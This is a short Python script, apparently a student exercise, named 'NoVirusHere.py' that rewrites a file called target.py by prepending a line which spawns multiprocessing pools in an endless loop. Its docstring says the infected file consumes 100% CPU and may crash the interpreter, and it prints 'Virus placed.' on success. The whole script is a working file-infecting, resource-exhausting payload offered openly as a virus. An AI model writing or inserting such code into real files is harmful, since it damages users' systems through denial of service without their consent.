Vline = "from multiprocessing import Pool \nwhile True: \n     p = Pool()"
"""
NoVirusHere.py
by Alex Mezodi (1401665)
Overwrites target.py with the code above.

When the target file is run, it starts
using up resources (100% CPU), and has
a chance of breaking the compiler.

Sorry it is more than 20 characters,
but I couldn't resist :)
"""
import re
embedded = False;
try :
    with open("target.py", "r+") as f:
            content = f.read()
            f.seek(0,0)
            f.write(Vline.rstrip('\r\n') + '\n' + content)
            print("Virus placed.")
except IOError as e :
    fIn = None
    print("Everything's fine.")


  
    

